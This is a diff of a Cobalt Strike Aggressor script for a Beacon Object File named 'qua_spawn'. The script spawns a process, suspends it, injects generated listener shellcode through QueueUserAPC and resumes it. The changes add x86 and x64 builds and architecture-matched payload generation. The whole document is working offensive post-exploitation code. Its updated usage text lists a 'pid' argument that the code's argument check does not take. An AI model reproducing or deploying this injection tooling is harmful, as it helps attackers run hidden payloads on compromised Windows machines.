@@ -2,11 +2,14 @@
 # Apr 2021
 # $1 = beacon ID
 # $2 = process
+# scp * 192.168.122.130:/root/BeaconObjectFile/qua_spawn
+# x86_64-w64-mingw32-gcc -c qua_spawn.c -o qua_spawn.x64.o
+# i686-w64-mingw32-gcc -c qua_spawn.c -o qua_spawn.x86.o
 # x86_64-w64-mingw32-gcc -c qua_spawn.c -o qua_spawn.o
 
 
 alias qua_spawn {
-	local('$bid $handle $data $path $listener $payload');
+	local('$bid $handle $data $path $listener $payload $barch');
 
 	# check our arguments
 	if (size(@_) != 3) {
@@ -19,7 +22,8 @@ alias qua_spawn {
 	$listener = $3;
 
 	# read in our BOF file...
-	$handle = openf(script_resource("qua_spawn.o"));
+	$barch = barch($1);
+	$handle = openf(script_resource("qua_spawn. $+ $barch $+ .o"));
 	$data	= readb($handle, -1);
 	closef($handle);
 
@@ -30,7 +34,7 @@ alias qua_spawn {
 	else
 	{
     		# Generate a new payload 
-    		$payload = payload($3, "x64", "process");
+    		$payload = payload($3, $barch, "process");
 		$handle2 = openf(">out.bin");
 		writeb($handle2, $payload);
 		closef($handle2);
@@ -45,5 +49,5 @@ alias qua_spawn {
 		beacon_inline_execute($1, $data, "go", $args);
 	}
 }
-beacon_command_register("qua_spawn", "QueueUserAPC spawn and inject method", "Synopsis: qua_spawn [path] [listener] \nExample Path: C:\\Windows\\System32\\calc.exe\n\nAsynchronous procedure call to queue a specific thread.\nSpawn, suspend, inject the shellcode, then resume.\n\nGenerated payload is exitfunc process intead of thread, so the spawned process kills itself on exit.");
+beacon_command_register("qua_spawn", "QueueUserAPC spawn and inject method", "Synopsis: qua_spawn [path] [pid] [listener]\nExample Path (x64): C:\\Windows\\System32\\calc.exe\nExample Path (x86): C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe\n\nAsynchronous procedure call to queue a specific thread.\nSpawn, suspend, inject the shellcode, then resume.\nGenerated payload is exitfunc process instead of thread, so the spawned process kills itself on exit.\n\nNote: x86->x86 or x64->x64 spawn only.");
 
